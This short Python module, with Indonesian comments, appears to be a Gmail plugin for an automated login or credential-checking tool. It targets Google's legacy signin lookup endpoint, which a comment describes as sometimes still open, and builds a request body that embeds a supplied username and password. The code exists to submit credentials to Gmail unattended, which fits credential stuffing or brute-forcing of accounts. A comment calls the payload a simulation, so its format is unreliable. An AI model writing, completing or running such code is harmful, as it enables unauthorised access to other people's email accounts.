def get_config():
    return {
        # Menggunakan endpoint stack lama yang kadang masih terbuka untuk aplikasi tertentu
        "url": "https://accounts.google.com/signin/v1/lookup", 
        "platform": "gmail"
    }

def get_payload(username, password):
    # Gmail memisahkan lookup email dan password verification
    # Ini simulasi payload JSON post-lookup
    return {
        "f.req": f'["{username}","{password}",null,null,null,null,true]',
        "deviceType": "0",
        "bgRequest": "unknown",
        "checkConnection": "youtube:224"
    }
